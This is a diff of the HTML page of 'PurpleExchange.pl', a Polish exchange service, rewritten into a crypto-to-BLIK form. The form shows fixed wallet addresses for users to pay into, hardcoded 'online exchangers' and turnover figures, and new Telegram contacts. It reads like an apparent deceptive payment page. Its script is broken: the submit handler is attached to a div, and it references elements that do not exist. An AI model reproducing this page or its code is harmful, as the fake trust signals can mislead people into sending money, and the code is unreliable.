@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
   <meta name="description" content="24/7, Wymieniamy crypto, PSC, Paypal, Przelewy, Skrill i wiele więcej! Jesteśmy zarejestrowaną i zweryfikowaną działalnością od 2022 roku.">
     <meta name="keywords" content="wymiana paysafecard, wymiana psc, exchange psc, exchange crypto, wymiana crypto, wymiana psc na paypal, wymiana psc na blik, wymiana crypto na paypal, wymiana crypto na blik, exchange empire, exchange service, serwis wymiany, serwis exchange, exchange discord polska, exchange discord serwer">
@@ -9,104 +11,370 @@
     <meta property="og:title" content="PurpleExchange.pl - Serwis wymiany">
     <meta property="og:description" content="24/7, Wymieniamy crypto, PSC, Paypal, Przelewy, Skrill i wiele więcej! Jesteśmy zarejestrowaną i zweryfikowaną działalnością od 2022 roku.">
     <title>PurpleExchange.pl - Serwis wymiany</title>
-    <link rel="stylesheet" href="styles.css">
+
+  <style>
+  body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+}
+
+#particles-js {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(to bottom, #4b0082, #9400d3);
+  top: 0;
+  left: 0;
+}
+
+.container {
+  position: relative;
+  z-index: 1;
+  max-width: 800px;
+  margin: 50px auto;
+  background-color: #2b2b2b;
+  padding: 40px;
+  border-radius: 10px;
+  box-shadow: 0 0 30px rgba(0, 0, 0, 0.4);
+  color: #ffffff;
+  text-align: center;
+  transition: transform 0.5s ease, box-shadow 0.5s ease;
+}
+
+.container:hover {
+  transform: scale(1.03);
+  box-shadow: 0 0 40px rgba(0, 0, 0, 0.6);
+}
+
+h1 {
+  color: #ff69b4;
+  font-size: 36px;
+  margin-bottom: 20px;
+}
+
+.exchange-form {
+  margin-top: 30px;
+}
+
+label {
+  display: block;
+  margin-bottom: 15px;
+  color: #ff69b4;
+  font-size: 18px;
+}
+
+select, input, button {
+  width: 100%;
+  padding: 18px;
+  margin-bottom: 25px;
+  border: 1px solid #4a4a4a;
+  border-radius: 10px;
+  background-color: #333333;
+  color: #ffffff;
+  transition: background 0.4s ease, transform 0.4s ease;
+}
+
+select:hover, input:hover, button:hover {
+  background-color: #444444;
+  transform: scale(1.05);
+}
+
+select {
+  appearance: none;
+  padding-right: 40px;
+  background: url('https://img.icons8.com/android/24/ffffff/expand-arrow.png') no-repeat right 12px center;
+  background-size: 20px;
+}
+
+input[type="tel"] {
+  padding-right: 40px;
+  background: url('https://img.icons8.com/android/24/ffffff/phone.png') no-repeat right 12px center;
+  background-size: 20px;
+}
+
+button {
+  background: linear-gradient(to bottom, #ff69b4, #8a2be2);
+  color: #ffffff;
+  border: none;
+  border-radius: 10px;
+  cursor: pointer;
+  font-weight: bold;
+  font-size: 18px;
+}
+
+button:hover {
+  background: linear-gradient(to bottom, #8a2be2, #4b0082);
+}
+
+#result {
+  margin-top: 30px;
+  color: #ffffff;
+  font-size: 22px;
+  opacity: 0;
+  transition: opacity 0.6s ease;
+}
+
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+  }
+  to {
+    opacity: 1;
+  }
+}
+
+#result.show {
+  animation: fadeIn 0.8s ease;
+  opacity: 1;
+}
+</style>
 </head>
-    <body>
-            <header>
-        <img src="https://i.postimg.cc/PfwJv24C/logo-no-background.png" alt="PurpleExchange.pl">
-        <nav>
-            <ul>
-                <li><a href="https://purpleexchange.pl">Strona główna</a></li>
-                <li><a href="https://t.me/purpleexchangepl">Wymiana</a></li>
-                <li><a href="https://t.me/purpleexchangepl">Prowizje</a></li>
-                <li><a href="https://t.me/lolonightmare">Kontakt</a></li>
-            </ul>
-        </nav>
-    </header>
-    <section class="description">
-        <h1>Witaj na PurpleExchange.pl</h1>
-        <p>PurpleExchange.pl to kantor wymiany, który oferuje szybkie i bezpieczne transakcje. <br>
-          Akceptujemy różne formy płatności, w tym PayPal, PSC, MYPSC, kryptowaluty i wiele innych. <br>
-          Nasza prowizja wynosi od 6%, ale nie mniej niż 2 PLN. Możesz wymieniać już od 10 PLN. <br>
-          Nasze transakcje zazwyczaj trwają mniej niż 24 godziny, często tylko kilka minut.</p>
-    </section>
-    <section class="exchange-form">
-        <h2>Formularz wymiany</h2>
-        <form id="exchange-form">
-            <label for="fromCurrency">Z:</label>
-            <input type="text" id="fromCurrency" name="fromCurrency" placeholder="Kwota i waluta wyjściowa">
-            <label for="toCurrency">Na:</label>
-            <input type="text" id="toCurrency" name="toCurrency" placeholder="Kwota i waluta docelowa">
-            
-            <label for="paymentMethod">Wybierz formę płatności:</label>
-            <select id="paymentMethod" name="paymentMethod">
-                <option value="Paysafecard">Paysafecard</option>
-                <option value="Paypal">Paypal</option>
-                <option value="Krypto">Krypto</option>
-                <option value="Skrill">Skrill</option>
-                <option value="Inne">Inne</option>
-            </select>
-            
-            <button type="button" id="calculate-button">Oblicz</button>
-        </form>
-        
-        <!-- Element do wyświetlania końcowej kwoty -->
-        <div id="finalAmount" style="display: none;">
-            <h3>Końcowa kwota:</h3>
-            <p id="finalAmountValue"></p>
-        </div>
-    </section>
+<body>
+  <div id="particles-js"></div>
+  <div class="container">
+      <p>
+    Support na telegram: @roaxxxx, @rockyyxz
+  </p>
+    <h1>PurpleExchange.pl - Wymieniaj Kryptowaluty na BLIK!</h1>
+    <div class="exchange-form">
+      <label for="cryptoSelect">Wybierz Kryptowalutę:</label>
+      <select id="cryptoSelect">
+        <option value="bitcoin">Bitcoin</option>
+        <option value="ethereum">Ethereum</option>
+                <option value="litecoin">Litecoin</option>
+                <option value="monero">Monero</option>
+                <option value="bnb">BNB</option>
+                <option value="doge">DOGE</option>
+      </select>
 
-    <!-- Inny kod HTML -->
+      <label for="amountInput">Podaj Kwotę:</label>
+      <input type="number" id="amountInput" placeholder="Ilość kryptowaluty">
 
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const calculateButton = document.getElementById("calculate-button");
-            const finalAmountDiv = document.getElementById("finalAmount");
-            const finalAmountValue = document.getElementById("finalAmountValue");
+      <label for="phoneInput">Numer Telefonu:</label>
+      <input type="tel" id="phoneInput" placeholder="Numer telefonu">
 
-            calculateButton.addEventListener("click", function() {
-                // Pobierz kwoty i waluty z pól formularza
-                const fromCurrencyValue = parseFloat(document.getElementById("fromCurrency").value);
-                const toCurrencyValue = parseFloat(document.getElementById("toCurrency").value);
+      <button id="exchangeBtn">Wymień na BLIK</button>
 
-                // Pobierz wybraną formę płatności
-                const paymentMethod = document.getElementById("paymentMethod").value;
+      <p>
+        Exchangerzy online: 14 | Fee za wymianę: 4,5% | Wymieniono już 48129PLN
+      </p>
+           <div id="result"></div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+  <script>
+document.addEventListener('DOMContentLoaded', function () {
+  particlesJS('particles-js', {
+    "particles": {
+      "number": {
+        "value": 80,
+        "density": {
+          "enable": true,
+          "value_area": 800
+        }
+      },
+      "color": {
+        "value": "#ffffff"
+      },
+      "shape": {
+        "type": "circle",
+        "stroke": {
+          "width": 0,
+          "color": "#000000"
+        },
+        "polygon": {
+          "nb_sides": 5
+        },
+        "image": {
+          "src": "img/github.svg",
+          "width": 100,
+          "height": 100
+        }
+      },
+      "opacity": {
+        "value": 0.5,
+        "random": false,
+        "anim": {
+          "enable": false,
+          "speed": 1,
+          "opacity_min": 0.1,
+          "sync": false
+        }
+      },
+      "size": {
+        "value": 3,
+        "random": true,
+        "anim": {
+          "enable": false,
+          "speed": 40,
+          "size_min": 0.1,
+          "sync": false
+        }
+      },
+      "line_linked": {
+        "enable": true,
+        "distance": 150,
+        "color": "#ffffff",
+        "opacity": 0.4,
+        "width": 1
+      },
+      "move": {
+        "enable": true,
+        "speed": 6,
+        "direction": "none",
+        "random": false,
+        "straight": false,
+        "out_mode": "out",
+        "bounce": false,
+        "attract": {
+          "enable": false,
+          "rotateX": 600,
+          "rotateY": 1200
+        }
+      }
+    },
+    "interactivity": {
+      "detect_on": "canvas",
+      "events": {
+        "onhover": {
+          "enable": true,
+          "mode": "repulse"
+        },
+        "onclick": {
+          "enable": true,
+          "mode": "push"
+        },
+        "resize": true
+      },
+      "modes": {
+        "grab": {
+          "distance": 400,
+          "line_linked": {
+            "opacity": 1
+          }
+        },
+        "bubble": {
+          "distance": 400,
+          "size": 40,
+          "duration": 2,
+          "opacity": 8,
+          "speed": 3
+        },
+        "repulse": {
+          "distance": 200
+        },
+        "push": {
+          "particles_nb": 4
+        },
+        "remove": {
+          "particles_nb": 2
+        }
+      }
+    },
+    "retina_detect": true
+  });
+});
 
-                // Oblicz prowizję na podstawie wybranej formy płatności
-                let commissionRate = 0;
+  </script>
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+  // Obsługa formularza
+  const exchangeForm = document.querySelector('.exchange-form');
+  const resultDiv = document.getElementById('result');
+  const exchangeBtn = document.getElementById('exchangeBtn');
 
-                switch (paymentMethod) {
-                    case "Paysafecard":
-                        commissionRate = 0.10;
-                        break;
-                    case "Paypal":
-                        commissionRate = 0.08;
-                        break;
-                    case "Krypto":
-                        commissionRate = 0.06;
-                        break;
-                    case "Skrill":
-                        commissionRate = 0.10;
-                        break;
-                    default:
-                        commissionRate = 0.15;
-                        break;
-                }
+  exchangeForm.addEventListener('submit', function (event) {
+    event.preventDefault();
+    
+    const cryptoSelect = document.getElementById('cryptoSelect');
+    const amountInput = document.getElementById('amountInput');
+    const phoneInput = document.getElementById('phoneInput');
 
-                // Oblicz końcową kwotę z prowizją
-                const commission = fromCurrencyValue * commissionRate;
-                const finalAmount = fromCurrencyValue - commission;
+    const selectedCrypto = cryptoSelect.value;
+    const amount = amountInput.value;
+    const phone = phoneInput.value;
 
-                // Wyświetl końcową kwotę na stronie
-                finalAmountValue.textContent = finalAmount.toFixed(2);
-                finalAmountDiv.style.display = "block";
-            });
+    // Logika wymiany kryptowaluty na BLIK i wyświetlenia komunikatu
+    const addressMap = {
+      bitcoin: 'bc1qpkv4qdhrhu7ken7cuhqrx5gpedvn0qhdwrj0mh',
+      ethereum: '0x967dcD2900c462C4DF0217eE5ED88431437A14a4',
+      litecoin: 'ltc1qmq4tc0vxq9jahzvtw2znl2lr4xlmnvktfhatq0',
+      monero: '82Zoh7bqxDASrp3GXFPzEB6wTSev7Sytp7MdbQdbHqX62oC2kNegz3H9KeUbMCq1gw3n1cLiHukepA2xWvgjWrAHNqs7wTN',
+      bnb: '0x967dcD2900c462C4DF0217eE5ED88431437A14a4',
+      doge: 'DFqueH6Q48vgmQ9opXwT9ouunfBMkU1oLV'
+    };
+
+    const address = addressMap[selectedCrypto];
+    const message = `Aby zfinalizować wymianę, wyślij na ten adres ${amount} ${selectedCrypto}:\n${address}\n\nOtrzymasz pieniądze na: ${phone}\nPrzewidywany czas wymiany: 5-15min\n\nJeśli wysłałeś pieniądze podaj tutaj TxID:\n[miejsce na txid]\n[przycisk gotowe]\n\nStatus: Wymienianie`;
+
+    // Ukryj formularz i pokaż komunikat
+    exchangeForm.style.display = 'none';
+    resultDiv.textContent = message;
+    resultDiv.classList.add('show');
+
+    // Sprawdzanie statusu transakcji co 5 sekund
+    const txIDInput = document.getElementById('txIDInput');
+    const checkStatusBtn = document.getElementById('checkStatusBtn');
+    let statusInterval;
+
+    checkStatusBtn.addEventListener('click', function () {
+      checkTransactionStatus(selectedCrypto, txIDInput.value);
+    });
+
+    function checkTransactionStatus(crypto, txID) {
+      // Sprawdzenie statusu transakcji za pomocą API Blockchair
+      const network = getNetwork(crypto);
+      const apiUrl = `https://api.blockchair.com/${network}/dashboards/transaction/${txID}`;
+      fetch(apiUrl)
+        .then(response => response.json())
+        .then(data => {
+          // Pobierz status transakcji z odpowiedzi API
+          const status = data.data.context.status;
+
+          // Aktualizacja komunikatu w zależności od statusu
+          if (status === 'confirmed') {
+            resultDiv.textContent = `Status: Otrzymano pieniądze`;
+          } else if (status === 'unconfirmed') {
+            resultDiv.textContent = `Status: Oczekiwanie na pieniądze`;
+          } else {
+            resultDiv.textContent = `Status: ${status}`;
+          }
+        })
+        .catch(error => {
+          console.error('Wystąpił błąd podczas pobierania statusu transakcji:', error);
         });
-    </script>
-    <section class="discord-telegram">
-        <a href="https://discord.gg/jeqnCYuHSF" class="discord-button"><img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Flogodownload.org%2Fwp-content%2Fuploads%2F2017%2F11%2Fdiscord-logo-0.png&f=1&nofb=1&ipt=90ae6c6e8ea4bb12e2490f18005aaef985251e75b09988f0dd0055b51c928662&ipo=images" alt="Discord"></a>
-        <a href="https://t.me/purpleexchangepl" class="telegram-button"><img src="https://i.postimg.cc/BQN0jKd8/icons8-telegram-48.png" alt="Telegram"></a>
-    </section>
+    }
+
+    function getNetwork(crypto) {
+      switch (crypto) {
+        case 'bitcoin':
+          return 'bitcoin';
+        case 'ethereum':
+          return 'ethereum';
+        case 'litecoin':
+          return 'litecoin';
+        case 'monero':
+          return 'monero';
+        case 'bnb':
+          return 'ethereum';
+        case 'doge':
+          return 'dogecoin';
+        default:
+          return 'bitcoin';
+      }
+    }
+
+    // Rozpocznij automatyczne sprawdzanie statusu po 20 sekundach
+    setTimeout(function () {
+      statusInterval = setInterval(function () {
+        checkTransactionStatus(selectedCrypto, txIDInput.value);
+      }, 5000);
+    }, 20000);
+  });
+});
+
+  </script>
 </body>
 </html>
